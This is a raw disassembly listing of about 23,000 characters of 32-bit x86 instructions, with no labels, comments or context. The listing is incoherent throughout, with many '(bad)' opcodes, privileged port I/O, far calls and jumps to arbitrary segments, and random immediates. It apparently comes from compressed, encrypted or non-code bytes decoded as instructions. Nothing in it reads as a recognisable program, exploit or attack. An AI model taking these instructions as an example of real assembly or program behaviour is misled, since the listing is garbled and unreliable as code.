  422a5e:	gs out 0x6,eax
  422a61:	rol    BYTE PTR ds:0x5b0001d1,1
  422a67:	add    BYTE PTR [eax],al
  422a69:	add    BYTE PTR [esi],ah
  422a6b:	push   ecx
  422a6c:	es add al,0xca
  422a6f:	inc    ecx
  422a70:	inc    ebp
  422a71:	and    al,0xca
  422a73:	cwde   
  422a74:	fcomp  st(5)
  422a76:	push   0x2e703e1
  422a7b:	pop    ebp
  422a7c:	sahf   
  422a7d:	std    
  422a7e:	data16 xor al,0xab
  422a81:	scas   eax,DWORD PTR es:[edi]
  422a82:	pop    ds
  422a83:	mov    eax,0xc5c6b28a
  422a88:	adc    cl,BYTE PTR [esi+esi*4]
  422a8b:	jg     0x422a3f
  422a8d:	enter  0x5cc6,0x4b
  422a91:	scas   eax,DWORD PTR es:[edi]
  422a92:	jns    0x422aa2
  422a94:	enter  0xe392,0x6d
  422a98:	jge    0x422a36
  422a9a:	loopne 0x422a43
  422a9c:	pop    ecx
  422a9d:	fsubr  DWORD PTR [eax]
  422a9f:	push   0x18
  422aa1:	in     eax,0x89
  422aa3:	add    al,0x2a
  422aa5:	dec    edi
  422aa6:	jp     0x422af1
  422aa8:	mov    bl,0xeb
  422aaa:	mov    al,ds:0xfc041660
  422aaf:	pop    esi
  422ab0:	call   0xab9a:0xdef6bbf5
  422ab7:	pop    esp
  422ab8:	pop    esp
  422ab9:	cmp    DWORD PTR [ebp-0x76],edx
  422abc:	and    al,0x1d
  422abe:	mov    ds:0xe17a7e14,eax
  422ac3:	int    0xb1
	...
  422ad1:	add    BYTE PTR [edi-0x28db29d],bl
  422ad7:	jle    0x422a98
  422ad9:	out    dx,eax
  422ada:	sbb    edi,esp
  422adc:	mov    BYTE PTR [edx+edx*1+0x6032d843],dh
  422ae3:	rol    DWORD PTR [ecx],1
  422ae5:	add    BYTE PTR [ebx+0x0],bl
  422ae8:	add    BYTE PTR [eax],al
  422aea:	jg     0x422a7f
  422aec:	jo     0x422a70
  422aee:	and    DWORD PTR [edx],0x18f640ed
  422af4:	mov    bh,0x80
  422af6:	push   ds
  422af7:	out    0x2e,al
  422af9:	jmp    0x422abc
  422afb:	out    dx,eax
  422afc:	imul   ecx,DWORD PTR [edx],0x1dc78e04
  422b02:	inc    ebp
  422b03:	fimul  DWORD PTR [ebp+0x6ec5deaf]
  422b09:	xchg   ebp,eax
  422b0a:	mov    dl,BYTE PTR [edi]
  422b0c:	pusha  
  422b0d:	xor    ah,BYTE PTR [ebx]
  422b0f:	add    DWORD PTR [esi-0x42],ebp
  422b12:	jmp    0x1bff4371
  422b17:	xchg   ecx,eax
  422b18:	jns    0x422b0b
  422b1a:	and    eax,0xc50a16e8
  422b1f:	imul   edx,DWORD PTR [eax+0x49c24922],0x790f4b5f
  422b29:	push   ebx
  422b2a:	repnz xor eax,0x56c867d3
  422b30:	mov    ds:0xcead1b90,al
  422b35:	es adc al,0x2e
  422b38:	imul   ebp,esi,0x4270d0e9
  422b3e:	out    0x9a,eax
  422b40:	repnz (bad) [ebx+edi*8]
  422b44:	xor    al,BYTE PTR [eax]
	...
  422b52:	jo     0x422b77
  422b54:	and    eax,0x7c6f7769
  422b59:	cmp    esp,DWORD PTR [eax+0x77bcee1c]
  422b5f:	into   
  422b60:	push   edx
  422b61:	adc    DWORD PTR [ebx+0x5b0001d1],edi
  422b67:	add    BYTE PTR [eax],al
  422b69:	add    BYTE PTR [edi+0x55],dh
  422b6c:	pop    eax
  422b6d:	outs   dx,WORD PTR ds:[esi]
  422b6f:	mov    al,ds:0x89770fc4
  422b74:	scas   al,BYTE PTR es:[edi]
  422b75:	mov    ebp,0xfabf91a1
  422b7a:	bound  edx,QWORD PTR [ecx-0x3e]
  422b7d:	inc    esp
  422b7e:	ins    DWORD PTR es:[edi],dx
  422b7f:	pop    ebp
  422b80:	inc    ebx
  422b81:	imul   esp,DWORD PTR [ebx+0xa8b5fcb],0xc3112801
  422b8b:	sub    ah,0x9f
  422b8e:	(bad)  
  422b8f:	push   ebp
  422b90:	xchg   DWORD PTR [esi-0x50],edx
  422b93:	dec    esp
  422b94:	mov    cl,0x84
  422b96:	pop    ebx
  422b97:	(bad)  
  422b98:	and    al,0x8
  422b9a:	cwde   
  422b9b:	je     0x422b5c
  422b9d:	add    dl,dl
  422b9f:	jmp    0x422be1
  422ba1:	pop    ebp
  422ba2:	(bad)  
  422ba3:	adc    bl,dl
  422ba5:	add    ch,ah
  422ba7:	call   0xc55:0xa4697979
  422bae:	add    edx,DWORD PTR [eax-0x649be2df]
  422bb4:	xchg   edi,eax
  422bb5:	shl    cl,1
  422bb7:	adc    BYTE PTR [ecx],0xeb
  422bba:	dec    ecx
  422bbb:	pop    ebx
  422bbc:	sub    BYTE PTR [eax+eiz*4],0x9f
  422bc0:	mov    ah,0x38
  422bc2:	pop    ebx
  422bc3:	mov    bl,0xc8
	...
  422bd1:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  422bd8:	popf   
  422bd9:	aam    0x57
  422bdb:	(bad)
  422bdf:	cs mov bh,0xc6
  422be2:	push   ss
  422be3:	rol    BYTE PTR [ecx],cl
  422be5:	add    BYTE PTR [ebx+0x0],bl
  422be8:	add    BYTE PTR [eax],al
  422bea:	push   cs
  422beb:	stos   BYTE PTR es:[edi],al
  422bec:	mov    cs,WORD PTR [ebp-0x10197722]
  422bf2:	cmp    ebx,ecx
  422bf4:	xchg   edx,eax
  422bf5:	adc    DWORD PTR [ebx+0x25283c62],ebx
  422bfb:	push   ss
  422bfc:	in     al,0x5f
  422bfe:	dec    ecx
  422bff:	push   ss
  422c00:	or     edx,eax
  422c02:	and    edi,DWORD PTR [ebp-0x6f]
  422c05:	cmc    
  422c06:	movmskps eax,xmm6
  422c09:	xchg   ebp,eax
  422c0a:	push   ebp
  422c0b:	push   ebx
  422c0c:	imul   esp,DWORD PTR [ebx-0x17],0xd79581b7
  422c13:	cwde   
  422c14:	cmp    edi,ebp
  422c16:	ss mov ebx,0x99cc73cf
  422c1c:	mov    BYTE PTR [ebp-0x74],al
  422c1f:	dec    eax
  422c20:	in     eax,dx
  422c21:	data16 outs dx,BYTE PTR ds:[esi]
  422c23:	xor    BYTE PTR [ecx+0x59],0xb3
  422c27:	cmp    eax,0x72b5c1c4
  422c2c:	clc    
  422c2d:	adc    al,0x1f
  422c2f:	pop    ebx
  422c30:	dec    esi
  422c31:	inc    DWORD PTR [esi]
  422c33:	xlat   BYTE PTR ds:[ebx]
  422c34:	(bad)  
  422c35:	out    0x2f,eax
  422c37:	(bad)  
  422c38:	out    0xa,al
  422c3a:	dec    esi
  422c3b:	xor    ah,0x44
  422c3e:	xchg   edi,eax
  422c3f:	fisttp DWORD PTR [esi+0x4cad79e2]
	...
  422c51:	add    ah,dh
  422c53:	mov    dl,0x32
  422c55:	(bad)  
  422c56:	jbe    0x422c2e
  422c58:	hlt    
  422c59:	mov    dl,0xb1
  422c5b:	and    al,0xfe
  422c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5e:	cli    
  422c5f:	int    0xf7
  422c61:	in     eax,dx
  422c62:	jno    0x422c36
  422c64:	add    DWORD PTR [eax],eax
  422c66:	pop    ebx
  422c67:	add    BYTE PTR [eax],al
  422c69:	add    cl,ch
  422c6b:	sub    eax,0xaf95ad52
  422c70:	or     eax,0xce0a470a
  422c75:	pop    ebx
  422c76:	stc    
  422c77:	pop    eax
  422c78:	pop    eax
  422c79:	mov    BYTE PTR [ebx-0x3de1c51d],ah
  422c7f:	imul   BYTE PTR [eax-0x66]
  422c82:	outs   dx,DWORD PTR ds:[esi]
  422c83:	es pop ecx
  422c85:	bound  ecx,QWORD PTR [ebp+eiz*2+0x69]
  422c89:	xor    ch,bh
  422c8b:	ret    
  422c8c:	pop    ecx
  422c8d:	test   BYTE PTR [bx+di],dl
  422c90:	call   0x17b7627f
  422c95:	cwde   
  422c96:	sbb    al,0xc0
  422c98:	gs dec esp
  422c9a:	adc    BYTE PTR [edi],bl
  422c9c:	sbb    BYTE PTR [ecx+eax*4-0x3f],dh
  422ca0:	pushf  
  422ca1:	or     bl,al
  422ca3:	mov    fs,eax
  422ca5:	ds test eax,0xa8011ed4
  422cab:	ja     0x422d16
  422cad:	hlt    
  422cae:	mov    edi,0xa13c1b81
  422cb3:	add    eax,0xb7cb52c0
  422cb8:	retf   
  422cb9:	int    0xf4
  422cbb:	sbb    BYTE PTR [esi-0x66],al
  422cbe:	div    cl
  422cc0:	mov    ebx,0xaccc60dd
	...
  422cd1:	add    BYTE PTR [edx],dh
  422cd3:	ror    esi,cl
  422cd5:	mov    ds:0xd37ebfef,al
  422cda:	sub    edi,DWORD PTR [esi]
  422cdc:	out    0x3f,eax
  422cde:	push   0xffffffdf
  422ce0:	mov    esi,0x1d2ccc6
  422ce5:	add    BYTE PTR [ebx+0x0],bl
  422ce8:	add    BYTE PTR [eax],al
  422cea:	fucomp st(4)
  422cec:	fsubr  QWORD PTR [esi-0x5fc194a6]
  422cf2:	jno    0x422d34
  422cf4:	fs stos DWORD PTR es:[edi],eax
  422cf6:	lahf   
  422cf7:	pop    edi
  422cf8:	sahf   
  422cf9:	push   0x64a4cfe2
  422cfe:	test   al,0x16
  422d00:	mov    dl,0x67
  422d02:	mov    al,ds:0x2202a49e
  422d07:	or     dl,BYTE PTR [ecx+eax*2+0x7a]
  422d0b:	lds    eax,FWORD PTR [esi]
  422d0d:	mov    dl,0xac
  422d0f:	lahf   
  422d10:	mov    edx,0x5b2b00eb
  422d15:	es retf 0x2419
  422d19:	xor    eax,0x9df506f5
  422d1e:	adc    al,dh
  422d20:	xchg   ebx,eax
  422d21:	je     0x422d07
  422d23:	inc    ebp
  422d24:	mov    esp,0x62be4661
  422d29:	dec    esp
  422d2a:	(bad)  [ebx+eax*1-0xead0c6f]
  422d31:	pop    es
  422d32:	xor    BYTE PTR fs:[esi+0x7d],0xcb
  422d37:	addr16 add al,0xaa
  422d3a:	inc    eax
  422d3b:	cmp    al,0xda
  422d3d:	push   edx
  422d3e:	inc    ebx
  422d3f:	cdq    
  422d40:	and    bh,ch
  422d42:	test   eax,0x8c00
	...
  422d4f:	add    BYTE PTR [eax],al
  422d51:	add    bl,bl
  422d53:	in     eax,dx
  422d54:	outs   dx,BYTE PTR ds:[esi]
  422d55:	and    bh,BYTE PTR [esi-0x5d]
  422d58:	(bad)  
  422d5a:	pop    esi
  422d5b:	(bad)  
  422d5c:	mov    DWORD PTR [ebp-0x79bafc4f],ecx
  422d62:	daa    
  422d63:	rol    DWORD PTR [ecx],cl
  422d65:	add    BYTE PTR [ebx+0x0],bl
  422d68:	add    BYTE PTR [eax],al
  422d6a:	clc    
  422d6b:	pop    ds
  422d6c:	mov    ds,WORD PTR [ecx]
  422d6e:	fisubr DWORD PTR [ebp+0x6f]
  422d71:	das    
  422d72:	sub    al,BYTE PTR [ebp+0x4d]
  422d75:	sub    eax,0x4f2c3eb3
  422d7a:	xchg   ecx,eax
  422d7b:	push   es
  422d7c:	xlat   BYTE PTR ds:[ebx]
  422d7d:	mov    ebp,0xb2221135
  422d82:	dec    edi
  422d84:	in     al,dx
  422d85:	pop    eax
  422d86:	sti    
  422d87:	pop    ss
  422d88:	jns    0x422db6
  422d8a:	lahf   
  422d8b:	test   eax,0x366c98bd
  422d90:	aam    0xc9
  422d92:	in     eax,0x51
  422d94:	sbb    DWORD PTR [eax],edx
  422d96:	fs inc eax
  422d98:	pop    edi
  422d99:	cmp    BYTE PTR [ecx+0x5d],0x1e
  422d9d:	xchg   edi,eax
  422d9e:	sti    
  422d9f:	cli    
  422da0:	fcmovu st,st(0)
  422da2:	pop    esp
  422da3:	iret   
  422da4:	push   ss
  422da5:	mov    bl,0xf6
  422da7:	jge    0x422de2
  422da9:	clc    
  422daa:	outs   dx,DWORD PTR ds:[esi]
  422dab:	push   ds
  422dac:	pop    ebx
  422dad:	fimul  WORD PTR [ecx+0x1f7eed34]
  422db3:	sub    eax,0x27f21b1d
  422db8:	push   ecx
  422db9:	fnstcw WORD PTR [esi+0x41]
  422dbc:	inc    ebp
  422dbd:	xor    dh,BYTE PTR [ebp+0x1017c2e0]
  422dc3:	mov    al,ds:0xa1
	...
  422dd0:	add    BYTE PTR [eax],al
  422dd2:	add    eax,0x6f976b22
  422dd7:	(bad)  
  422dd9:	mov    dl,0x66
  422ddb:	and    BYTE PTR [esi+0x7e08246a],ah
  422de1:	ja     0x422d65
  422de3:	rol    DWORD PTR [ecx],cl
  422de5:	add    BYTE PTR [ebx+0x0],bl
  422de8:	add    BYTE PTR [eax],al
  422dea:	mov    dl,0x62
  422dec:	inc    edi
  422ded:	cmp    al,bl
  422def:	(bad)  
  422df0:	dec    edx
  422df1:	mov    ds:0xcfb133ef,eax
  422df6:	std    
  422df7:	mov    DWORD PTR [eax-0xe68ff2c],ebx
  422dfd:	pop    edi
  422dfe:	test   BYTE PTR [edx-0x416ae1f1],0xc0
  422e05:	mov    esi,0x48ff50d5
  422e0a:	and    al,0x56
  422e0c:	loope  0x422da5
  422e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e0f:	sub    BYTE PTR [eax+0x2c],bh
  422e12:	jge    0x422e47
  422e14:	rol    DWORD PTR [esi-0x74c2ce08],1
  422e1a:	jns    0x422e86
  422e1c:	aad    0x10
  422e1e:	add    dh,BYTE PTR es:[edx+ebx*1-0x9d75711]
  422e26:	or     edi,DWORD PTR [esi+0x1f]
  422e29:	dec    edx
  422e2a:	cmp    eax,0xdfcddbcb
  422e2f:	dec    eax
  422e30:	sahf   
  422e31:	and    al,0x33
  422e33:	adc    dh,BYTE PTR [edx+0x3a8d7ff1]
  422e39:	jg     0x422de8
  422e3b:	jo     0x422dd8
  422e3d:	sub    BYTE PTR [esp+ebp*2+0x56],cl
  422e41:	ja     0x422ddb
  422e43:	aas    
  422e44:	fadd   QWORD PTR [eax]
	...
  422e52:	mov    edx,esp
  422e54:	and    al,0xd9
  422e56:	jg     0x422e51
  422e58:	call   esi
  422e5a:	into   
  422e5b:	inc    ebp
  422e5c:	mov    bh,0x11
  422e5e:	(bad)  
  422e5f:	jg     0x422e21
  422e61:	aam    0xdd
  422e63:	rol    DWORD PTR [ecx],cl
  422e65:	add    BYTE PTR [ebx+0x0],bl
  422e68:	add    BYTE PTR [eax],al
  422e6a:	aad    0xf7
  422e6c:	lods   eax,DWORD PTR es:[esi]
  422e6e:	inc    BYTE PTR [ebp+ecx*4-0x7ec5adde]
  422e75:	shr    BYTE PTR [edi+0x3d],cl
  422e78:	pushf  
  422e79:	(bad)  
  422e7a:	out    dx,eax
  422e7b:	cmp    DWORD PTR [edi+0x4382f046],esi
  422e81:	mov    ?,edi
  422e83:	fsubr  QWORD PTR [edi-0x1d]
  422e86:	add    esp,DWORD PTR [esi+0x56]
  422e89:	pushf  
  422e8a:	out    0x4c,eax
  422e8c:	leave  
  422e8d:	xchg   ebx,eax
  422e8e:	mov    al,ds:0xff65465b
  422e93:	sub    eax,0xe96da7a
  422e98:	aaa    
  422e99:	bound  ebx,QWORD PTR [ebx-0x12]
  422e9c:	xor    DWORD PTR [edi+0x29],ecx
  422e9f:	add    eax,0x7802323d
  422ea4:	adc    bl,BYTE PTR [edx+0x48]
  422ea7:	push   ebp
  422ea8:	jmp    0x422f1f
  422eaa:	pushf  
  422eab:	out    dx,al
  422eac:	int    0x13
  422eae:	in     al,dx
  422eaf:	int    0xee
  422eb1:	addr16 mov eax,ds:0xe074
  422eb5:	test   BYTE PTR [eax-0x487ac149],ch
  422ebb:	retf   0x7e01
  422ebe:	mov    WORD PTR [edx+0x1a0ca1ed],ss
  422ec4:	push   esp
	...
  422ed1:	add    dh,bl
  422ed3:	sub    DWORD PTR [eax-0x210c002e],ebx
  422ed9:	sub    eax,0x4af35f6
  422ede:	adc    al,0xb9
  422ee0:	push   0x1d438b0
  422ee5:	add    BYTE PTR [ebx+0x0],bl
  422ee8:	add    BYTE PTR [eax],al
  422eea:	fidivr WORD PTR [edi+0xc749d09]
  422ef1:	sub    BYTE PTR [edi+0x49],ah
  422ef4:	pushf  
  422ef5:	sahf   
  422ef6:	xor    eax,0x32d7179a
  422efb:	loop   0x422ee7
  422efd:	add    DWORD PTR [esi+0x36],ecx
  422f00:	jo     0x422ede
  422f02:	in     al,dx
  422f03:	(bad)  
  422f04:	js     0x422f47
  422f06:	mov    ah,0x9b
  422f08:	pop    ds
  422f09:	mov    eax,ds:0xe8c0b6cf
  422f0e:	ins    BYTE PTR es:[edi],dx
  422f0f:	cmp    al,0x52
  422f11:	push   esi
  422f12:	loop   0x422f53
  422f14:	adc    ecx,esi
  422f16:	in     al,0x77
  422f18:	jg     0x422ebf
  422f1a:	(bad)  
  422f1b:	mov    WORD PTR [ebp+0x40],gs
  422f1e:	fs dec esi
  422f20:	jge    0x422f5c
  422f22:	cli    
  422f23:	lods   al,BYTE PTR ds:[esi]
  422f24:	xor    edx,edi
  422f26:	cmc    
  422f27:	cs daa 
  422f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f2a:	(bad)  
  422f2b:	minps  xmm3,xmm3
  422f2e:	lahf   
  422f2f:	sbb    eax,0xae0576f4
  422f34:	rep lods al,BYTE PTR ds:[esi]
  422f36:	outs   dx,BYTE PTR ds:[esi]
  422f37:	gs (bad) 
  422f39:	iret   
  422f3a:	push   ebp
  422f3b:	adc    ebp,DWORD PTR [esi+eax*8]
  422f3e:	sub    eax,0xc5917103
  422f43:	xchg   ebx,eax
  422f44:	mov    al,0x0
	...
  422f52:	dec    esi
  422f53:	aas    
  422f54:	int3   
  422f55:	sbb    eax,0x7fdffffd
  422f5a:	out    dx,eax
  422f5b:	loopne 0x422f73
  422f5d:	lods   al,BYTE PTR ds:[esi]
  422f5e:	fstp   TBYTE PTR [ecx-0x5f]
  422f61:	ja     0x422ef6
  422f63:	aam    0x1
  422f65:	add    BYTE PTR [ebx+0x0],bl
  422f68:	add    BYTE PTR [eax],al
  422f6a:	(bad)  
  422f6c:	xor    DWORD PTR [eax+0x513f2a4e],0x8bb050a9
  422f76:	mov    ebp,0xf0d31002
  422f7b:	sbb    BYTE PTR [ecx-0x33b284c],dl
  422f81:	ret    
  422f82:	mov    esp,0x365e3348
  422f87:	mov    esp,0xea5426d
  422f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f8d:	push   cs
  422f8e:	add    eax,DWORD PTR [edx-0x1f]
  422f91:	add    eax,0x34d7242a
  422f96:	jmp    0x1c0:0x6ec3205c
  422f9d:	mov    bl,0x82
  422f9f:	nop
  422fa0:	pop    edx
  422fa1:	in     al,0x34
  422fa3:	xor    BYTE PTR [edx+ebp*1],ah
  422fa6:	xchg   edi,eax
  422fa7:	sub    al,BYTE PTR [edi+0x5c]
  422faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fab:	mov    bl,0x98
  422fad:	mov    edx,DWORD PTR [edi+0x63982167]
  422fb3:	and    DWORD PTR [ebp-0x43],0xffffff84
  422fb7:	adc    ecx,ecx
  422fb9:	add    al,ch
  422fbb:	inc    ebx
  422fbc:	mov    bh,0xab
  422fbe:	mov    al,0xf3
  422fc0:	nop
  422fc1:	je     0x423036
  422fc3:	lock add BYTE PTR [eax],al
	...
  422fd2:	push   ds
  422fd3:	test   eax,0x7ff735f6
  422fd8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fde:	hlt    
  422fdf:	sbb    DWORD PTR [eax],ebp
  422fe1:	or     dh,ch
  422fe3:	aam    0x1
  422fe5:	add    BYTE PTR [ebx+0x0],bl
  422fe8:	add    BYTE PTR [eax],al
  422fea:	lods   eax,DWORD PTR ds:[esi]
  422feb:	push   edx
  422fec:	js     0x422f78
  422fee:	pop    ecx
  422fef:	mov    bl,0x18
  422ff1:	mov    WORD PTR [ebx+0x43],ss
  422ff4:	out    0x89,eax
  422ff6:	popa   
  422ff7:	or     DWORD PTR [eax-0x62de64be],esp
  422ffd:	loope  0x422f8d
  422fff:	pop    ebp
  423000:	call   0x492b:0xabf79569
  423007:	scas   eax,DWORD PTR es:[edi]
  423008:	xor    ecx,DWORD PTR [ebx+edx*8-0x6f270527]
  42300f:	test   DWORD PTR [esi],0xbfb169d0
  423015:	inc    esp
  423016:	xor    al,0xb9
  423018:	cmp    BYTE PTR [ebp-0x69],cl
  42301b:	mov    ch,bl
  42301d:	pop    esp
  42301e:	sbb    BYTE PTR [edx],dl
  423020:	adc    al,0xf4
  423022:	xor    DWORD PTR [ecx-0x33],eax
  423025:	outs   dx,BYTE PTR ds:[esi]
  423026:	sbb    BYTE PTR [edi-0x12],ah
  423029:	or     DWORD PTR [edi+0x31],ebx
  42302c:	pusha  
  42302d:	cmp    BYTE PTR [eax+0x8b310e2],dl
  423033:	sbb    eax,0x9d98bb0c
  423038:	ret    
  423039:	sbb    eax,edx
  42303b:	sbb    ah,ch
  42303d:	cmp    ecx,DWORD PTR [edi+0x7b]
  423040:	into   
  423041:	aaa    
  423042:	push   ebx
  423043:	in     al,dx
  423044:	inc    esi
	...
  423051:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  423057:	lods   eax,DWORD PTR ds:[esi]
  423058:	fcomi  st,st(7)
  42305a:	sar    BYTE PTR [ebx],cl
  42305c:	(bad)  
  42305d:	add    bl,ch
  42305f:	push   es
  423060:	lock xor DWORD PTR [ecx-0x2b],ecx
  423064:	add    DWORD PTR [eax],eax
  423066:	pop    ebx
  423067:	add    BYTE PTR [eax],al
  423069:	add    BYTE PTR [esp+edx*1],bh
  42306c:	fs xor eax,0x47152148
  423072:	pop    edx
  423073:	aam    0xca
  423075:	lea    esp,[ecx*8+0x10ead525]
  42307c:	sbb    BYTE PTR [ecx-0x32],0x58
  423080:	scas   al,BYTE PTR es:[edi]
  423081:	sub    BYTE PTR [edx+0x5c159637],ch
  423087:	jle    0x423097
  423089:	dec    ebp
  42308a:	jo     0x423062
  42308c:	push   esp
  42308d:	pop    ebp
  42308e:	jb     0x423062
  423090:	xchg   esp,eax
  423091:	or     al,0x40
  423093:	mov    ?,ebx
  423095:	(bad)  
  423096:	fisub  WORD PTR [ebp-0x15d6920e]
  42309c:	stos   BYTE PTR es:[edi],al
  42309d:	cli    
  42309e:	and    eax,0x98328bc3
  4230a3:	ja     0x4230ef
  4230a5:	mov    WORD PTR ds:0x6f55eadd,?
  4230ab:	pop    esp
  4230ac:	or     eax,0x443dbbf8
  4230b1:	dec    eax
  4230b2:	adc    BYTE PTR [ebx+0x74],0x2d
  4230b6:	jmp    0x3c52c7e1
  4230bb:	and    BYTE PTR [ebp-0x73],ch
  4230be:	mov    WORD PTR [ebx-0x396581cb],fs
  4230c4:	push   ecx
	...
  4230d1:	add    BYTE PTR [eax],cl
  4230d3:	div    DWORD PTR [edi+0x4a]
  4230d6:	dec    edx
  4230d8:	cmp    eax,0x2e8eedf7
  4230dd:	dec    eax
  4230de:	repnz mov ds:0x1d5a41d,ax
  4230e5:	add    BYTE PTR [ebx+0x0],bl
  4230e8:	add    BYTE PTR [eax],al
  4230ea:	adc    BYTE PTR [esi+0x565530aa],al
  4230f0:	and    DWORD PTR [edx],ecx
  4230f2:	out    0xfd,al
  4230f4:	dec    edi
  4230f5:	gs cmp al,0x14
  4230f8:	cmc    
  4230f9:	data16 sbb BYTE PTR [ebx-0x3a75527c],bh
  423100:	jp     0x4230f3
  423102:	stos   DWORD PTR es:[edi],eax
  423103:	push   ebp
  423104:	pop    esi
  423105:	cwde   
  423106:	fscale 
  423108:	cwde   
  423109:	cs cs jg 0x4230a6
  42310d:	push   0xfffffff8
  42310f:	inc    edi
  423110:	das    
  423111:	xchg   edi,eax
  423112:	push   esp
  423113:	aam    0xd4
  423115:	sbb    esi,DWORD PTR [esi+0x219d7cf5]
  42311b:	sub    DWORD PTR [ebp-0x78],0xa6144a4e
  423122:	mov    ss,WORD PTR [edi-0x72]
  423125:	imul   ecx,ebx,0x8
  423128:	jae    0x423178
  42312a:	mov    ?,WORD PTR [edi-0x51]
  42312d:	xchg   ebx,eax
  42312e:	ins    DWORD PTR es:[edi],dx
  42312f:	arpl   WORD PTR [edx],di
  423131:	cdq    
  423132:	in     eax,dx
  423133:	mov    dl,0x40
  423135:	pusha  
  423136:	add    esp,DWORD PTR [ecx+0x52]
  423139:	nop
  42313a:	ins    DWORD PTR es:[edi],dx
  42313b:	and    DWORD PTR [eax+esi*4+0x6582a768],0x21
  423143:	mov    esi,0xc7
	...
  423150:	add    BYTE PTR [eax],al
  423152:	arpl   WORD PTR ss:[eax-0x10],bp
  423156:	jge    0x423153
  423158:	mov    esi,0x8c7853e7
  42315d:	daa    
  42315e:	sbb    ch,0xd4
  423161:	mov    esp,0x1d5ff
  423166:	pop    ebx
  423167:	add    BYTE PTR [eax],al
  423169:	add    BYTE PTR [eax+eax*1-0x3a],ah
  42316d:	push   edi
  42316e:	stc    
  42316f:	cmc    
  423170:	and    ecx,DWORD PTR [edx+0x7f]
  423173:	sub    al,0xaf
  423175:	sbb    BYTE PTR [edi+0x40],al
  423178:	pop    ss
  423179:	jnp    0x4231a3
  42317b:	cmc    
  42317c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42317d:	imul   ebx,DWORD PTR [esp+ebp*2+0xe],0x7a74612d
  423185:	and    al,0x32
  423187:	pop    ss
  423188:	mov    ds:0x388df96,eax
  42318d:	jge    0x423157
  42318f:	ret    
  423190:	scas   al,BYTE PTR es:[edi]
  423191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423192:	push   ds
  423193:	xchg   ecx,eax
  423194:	lods   al,BYTE PTR ds:[esi]
  423195:	jg     0x423134
  423197:	sahf   
  423198:	aam    0x15
  42319a:	inc    eax
  42319b:	push   ss
  42319c:	push   0xd9e7d6eb
  4231a1:	inc    edi
  4231a2:	mov    dh,0xaf
  4231a4:	jns    0x4231f7
  4231a6:	arpl   WORD PTR [ecx-0x29],si
  4231a9:	mov    gs,WORD PTR [ecx+0x219f869e]
  4231af:	pop    edx
  4231b0:	mov    al,ds:0xe44b8fff
  4231b5:	inc    eax
  4231b6:	inc    esp
  4231b7:	out    0xb8,eax
  4231b9:	xor    BYTE PTR [eax],al
  4231bb:	aas    
  4231bc:	mov    ebx,0xb0174f5a
  4231c1:	(bad)  
  4231c2:	jns    0x423180
  4231c4:	fild   DWORD PTR [eax]
	...
  4231d2:	daa    
  4231d3:	push   ecx
  4231d4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231de:	pop    ebp
  4231df:	stos   BYTE PTR es:[edi],al
  4231e0:	jno    0x4231e6
  4231e2:	rcr    ah,0x1
  4231e5:	add    BYTE PTR [ebx+0x0],bl
  4231e8:	add    BYTE PTR [eax],al
  4231ea:	hlt    
  4231eb:	mov    dh,0xaa
  4231ed:	sbb    esp,DWORD PTR [edx-0x51]
  4231f0:	inc    ebp
  4231f1:	pop    ds
  4231f2:	scas   al,BYTE PTR es:[edi]
  4231f3:	push   es
  4231f4:	cmc    
  4231f5:	mov    ebp,0x38684ac0
  4231fa:	out    0x71,al
  4231fc:	ds inc edx
  4231fe:	mov    al,ds:0x82ae26a0
  423203:	adc    cl,BYTE PTR [edx+0x1b]
  423206:	sbb    bl,al
  423208:	dec    esi
  423209:	ret    0xada9
  42320c:	mov    ebp,DWORD PTR [edx+eiz*4-0x7b]
  423210:	lds    ebp,FWORD PTR [edx+0x77]
  423213:	test   DWORD PTR [esi],ecx
  423215:	push   esi
  423216:	cmp    eax,ebp
  423218:	pop    ebp
  423219:	or     eax,0x5e598ee9
  42321e:	jne    0x42321c
  423220:	and    al,0x30
  423223:	jo     0x4231c9
  423225:	cmp    DWORD PTR [edx-0x525d063b],0x1a
  42322c:	xor    BYTE PTR [edi+0x2e6b6d8f],cl
  423232:	sti    
  423233:	nop
  423234:	(bad)  
  423235:	jno    0x42328c
  423237:	or     al,0xd7
  423239:	je     0x4232b9
  42323b:	les    esp,FWORD PTR [edx-0x38958619]
  423241:	lds    edx,FWORD PTR [ecx-0xc]
  423244:	or     eax,0x0
	...
  423251:	add    BYTE PTR [edi],ah
  423253:	ss lahf 
  423255:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42325b:	and    eax,0xbfc9075b
  423260:	pusha  
  423261:	iret   
  423262:	sbb    ebx,ebp
  423264:	add    DWORD PTR [eax],eax
  423266:	pop    ebx
  423267:	add    BYTE PTR [eax],al
  423269:	add    BYTE PTR [ebp-0x5f],bh
  42326c:	xlat   BYTE PTR ds:[ebx]
  42326d:	rol    BYTE PTR [eax-0x60],cl
  423270:	fwait
  423271:	sar    BYTE PTR [eax-0x6e],cl
  423274:	xor    eax,0x7b0d1e14
  423279:	sub    ah,BYTE PTR [edi-0x6fbf2957]
  42327f:	xlat   BYTE PTR ds:[ebx]
  423280:	sbb    DWORD PTR [edi-0x3cbf3a8b],esi
  423286:	mov    dl,0x23
  423288:	shl    edx,1
  42328a:	ror    BYTE PTR [ebx],cl
  42328c:	xor    eax,0xffffffcd
  42328f:	xor    ah,dl
  423291:	xor    ecx,DWORD PTR [esi]
  423293:	cmc    
  423294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423295:	test   eax,0xb982c728
  42329a:	adc    ebx,DWORD PTR [ecx]
  42329c:	into   
  42329d:	mov    dl,0x37
  42329f:	in     eax,dx
  4232a0:	cld    
  4232a1:	jmp    0x868ae0bb
  4232a6:	(bad)  
  4232a9:	push   cs
  4232aa:	jno    0x4232c9
  4232ac:	inc    eax
  4232ad:	mov    cl,dl
  4232af:	cmp    DWORD PTR [ebp+0x6],0xf7b8ce83
  4232b6:	mul    dh
  4232b8:	iret   
  4232b9:	arpl   bp,ax
  4232bb:	mov    bh,0xc5
